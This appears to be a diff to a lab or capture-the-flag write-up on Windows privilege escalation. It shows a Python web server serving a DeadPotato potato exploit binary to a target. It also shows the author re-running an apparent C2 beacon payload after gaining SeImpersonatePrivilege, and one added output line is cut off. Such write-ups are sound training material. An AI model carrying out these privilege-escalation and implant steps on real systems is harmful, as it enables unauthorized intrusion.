@@ -761,16 +761,10 @@ PS C:\Windows\system32>
 
 I now have SeImpersonatePrivilege
 
-https://github.com/lypd0/DeadPotato/releases
+I will now re execute my beacon payload to get a higher privilege beacon
 
 ```python
-python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.129.48.21 - - [20/Aug/2026 21:39:50] "GET /DeadPotato-NET4.exe HTTP/1.1" 200 -
+PS C:\Temp> ./http.x64.exe
+./http.x64.ex
 ```
 
-Using a python web server and wget i can transfer it to the target
-
-```python
-
-```
